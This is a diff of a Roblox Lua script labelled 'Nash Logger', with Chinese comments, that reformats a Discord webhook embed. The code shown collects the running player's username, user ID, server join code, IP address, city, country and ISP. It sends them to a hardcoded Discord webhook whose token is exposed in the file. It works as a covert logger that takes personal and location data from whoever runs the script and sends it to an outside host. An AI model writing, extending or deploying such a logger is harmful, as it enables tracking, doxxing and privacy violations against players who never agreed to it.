@@ -7,9 +7,10 @@ local LocalPlayer = Players.LocalPlayer
 --// 設定
 local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
 local gameName = "Unknown"
+local embedColor = tonumber("0x2ECC71" ) -- 清晰的綠色
 
 --// 增強的 HTTP 請求函數
-local function secureRequest(options )
+local function secureRequest(options)
     local requestFunc = request or http_request or (syn and syn.request )
     if requestFunc then
         local success, response = pcall(function() return requestFunc(options) end)
@@ -58,47 +59,44 @@ pcall(function()
     -- 3. 建立個人資料連結
     local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"
 
-    -- 4. 準備 embed 的 description，包含所有核心資訊
-    local description = string.format(
-        "**真實名稱:** %s\n" ..
-        "**顯示名稱:** %s\n" ..
-        "**玩家ID:** %s\n" ..
-        "**個人資料:** [Roblox 個人頁面](%s)\n" ..
-        "**遊戲:** %s\n" ..
-        "**玩家伺服器人數:** %d\n" ..
-        "**加入代碼:** %s",
-        LocalPlayer.Name,
-        LocalPlayer.DisplayName,
-        tostring(LocalPlayer.UserId),
-        profileUrl,
-        gameName,
-        #Players:GetPlayers(),
-        game.JobId or "N/A"
-    )
+    -- 4. 準備 embed 的 fields 陣列
+    local fields = {
+        -- 大標題: 玩家
+        { name = "─────────── 玩家資訊 ───────────", value = "**顯示名稱:** " .. LocalPlayer.DisplayName, inline = false },
+        
+        -- 第一行並排
+        { name = "真實名稱:", value = "```" .. LocalPlayer.Name .. "```", inline = true },
+        { name = "ID:", value = "```" .. tostring(LocalPlayer.UserId) .. "```", inline = true },
+        
+        -- 第二行並排
+        { name = "個人資料:", value = "[點擊查看](" .. profileUrl .. ")", inline = true },
+        { name = "遊戲:", value = "```" .. gameName .. "```", inline = true },
 
-    -- 5. 將 IP 資訊附加到 description 的末尾
+        -- 第三行 (單獨一行)
+        { name = "加入代碼:", value = "```" .. (game.JobId or "N/A") .. "```", inline = false },
+    }
+
+    -- 5. 如果成功獲取到 IP，則將其作為第二個區塊加入
     if secretInfo and secretInfo.ip then
         local ip_info = secretInfo.details
         local location = (ip_info and ip_info.country and ip_info.city) and (ip_info.country .. ", " .. ip_info.city) or "未知"
         local isp = (ip_info and ip_info.org) or "未知"
         
-        local secretBlock = string.format(
-            "\n\n**網路資訊 (機密):**\n" ..
-            "||**IP 位址:** %s||\n" ..
-            "||**推測位置:** %s||\n" ..
-            "||**網路供應商:** %s||",
-            secretInfo.ip, location, isp
-        )
-        description = description .. secretBlock
+        -- 添加分隔線和大標題
+        table.insert(fields, { name = "\u{200B}", value = "────────── **玩家IP資訊** ──────────", inline = false })
+        
+        -- 添加 IP 資訊 (使用劇透標籤)
+        table.insert(fields, { name = "IP 地址:", value = "||" .. secretInfo.ip .. "||", inline = false })
+        table.insert(fields, { name = "推測位置:", value = "||" .. location .. "||", inline = false })
+        table.insert(fields, { name = "網路供應商:", value = "||" .. isp .. "||", inline = false })
     end
 
     -- 6. 構建並發送最終的 webhook 資料
     local data = {
-        username = "Script Logger",
+        username = "執行日誌",
         embeds = {{
-            title = "腳本執行紀錄",
-            description = description,
-            color = tonumber("0x3498db"), -- 經典的藍色
+            color = embedColor,
+            fields = fields,
             footer = {
                 text = "Nash Logger"
             },
